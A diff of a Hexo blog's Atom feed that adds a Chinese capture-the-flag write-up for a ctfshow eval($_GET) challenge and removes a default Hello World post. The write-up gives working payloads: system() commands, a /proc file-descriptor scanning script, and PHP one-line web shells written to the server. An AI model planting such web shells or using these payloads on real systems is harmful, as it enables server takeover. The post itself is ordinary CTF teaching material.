@@ -6,7 +6,7 @@
   <link href="https://d3n13d.github.io/atom.xml" rel="self"/>
   
   <link href="https://d3n13d.github.io/"/>
-  <updated>2022-01-28T14:45:09.981Z</updated>
+  <updated>2022-01-29T06:57:57.259Z</updated>
   <id>https://d3n13d.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ctfshow _新春欢乐赛 热身题的发散思维</title>
+    <link href="https://d3n13d.github.io/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/"/>
+    <id>https://d3n13d.github.io/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/</id>
+    <published>2022-01-29T06:42:42.000Z</published>
+    <updated>2022-01-29T06:57:57.259Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow-新春欢乐赛-热身题的发散思维"><a href="#ctfshow-新春欢乐赛-热身题的发散思维" class="headerlink" title="ctfshow _新春欢乐赛 热身题的发散思维"></a>ctfshow _新春欢乐赛 热身题的发散思维</h1><p>打开环境，源码一目了然</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2022-01-16 15:42:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里有个h1xa的小设计，可以看到代码里没有 highlight_file，源码为什么会自己高亮显示？原因很简单因为有auto_append这类预加载文件</p><p>本文尝试用多个解法</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>因为预加载文件会把那个文件的里定义的变量加载到当前文件的变量表里，所以可以有</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291201525.png" alt="image-20220129120114450"></p><h3 id="proc-文件目录获取flag"><a href="#proc-文件目录获取flag" class="headerlink" title="/proc/文件目录获取flag"></a>/proc/文件目录获取flag</h3><p><code>?f=system(&quot;ls /proc/&quot;);</code> 查看正在运行的进程</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291210025.png" alt="image-20220129121033949"></p><p>好吧经过实践这个思路不行,这里 /proc/ 目录下内容所属用户和组都是root,而提供服务的是www-data，自己写的小脚本先贴在这儿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">7</span>,<span class="hljs-number">76</span>]:<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>        url=<span class="hljs-string">&quot;http://0f8360bf-70b5-485e-a69a-0889ce967e3c.challenge.ctf.show/?f=system(&#x27;nl /proc/%d/fd/%d&#x27;);&quot;</span> %(i,j)<br>        <br>        url=url.<span class="hljs-built_in">format</span>(i,j)<br>        r=requests.get(url=url,)<br>        sleep(<span class="hljs-number">0.5</span>)<br>        result=r.text+url+<span class="hljs-string">&#x27;\n&#x27;</span><br>        output=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>        output.write(result)<br>        <span class="hljs-built_in">print</span>(r)<br>        output.close()<br><br></code></pre></td></tr></table></figure><h2 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h2><h3 id="系统命令写马"><a href="#系统命令写马" class="headerlink" title="系统命令写马"></a>系统命令写马</h3><p><code>?f=system(&quot;echo &#39;\n&lt;?php eval(\$_POST[1]);?&gt;&#39;  &gt; 2.php&quot;);</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291205578.png" alt="image-20220129120539506"></p><p>这题正好就是secret 一般也就是  secret hint这种，然后直接cat 查看源码即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291206561.png" alt="image-20220129120625494"></p><h3 id="PHP函数写马"><a href="#PHP函数写马" class="headerlink" title="PHP函数写马"></a>PHP函数写马</h3><p><code>?f=fputs(fopen(&#39;cmd.php&#39;,&#39;w&#39;),&quot;&lt;?php @eval(\$_POST[cmd])?&gt;&quot;);</code></p><p><img src="C:/Users/16476/AppData/Roaming/Typora/typora-user-images/image-20220129120824029.png" alt="image-20220129120824029"></p><p>然后就和上面一样</p><h2 id="php-amp-phpinfo解法"><a href="#php-amp-phpinfo解法" class="headerlink" title="php&amp;phpinfo解法"></a>php&amp;phpinfo解法</h2><p><strong>php -i</strong></p><p>这条命令等同于phpinfo(); 因此getshell之后可以用它来看phpinfo的信息</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456624.png" alt="image-20220129145606559"></p><p><strong>phpinfo</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291456306.png" alt="image-20220129145636243"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
+    
+    
+    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>BUUCTF-web-第三页wp分享</title>
@@ -174,26 +198,6 @@
     
     
     <category term="逆向" scheme="https://d3n13d.github.io/categories/%E9%80%86%E5%90%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="https://d3n13d.github.io/2022/01/07/hello-world/"/>
-    <id>https://d3n13d.github.io/2022/01/07/hello-world/</id>
-    <published>2022-01-07T07:22:50.495Z</published>
-    <updated>2022-01-07T07:22:50.495Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
-      
-    
-    
     
     
   </entry>
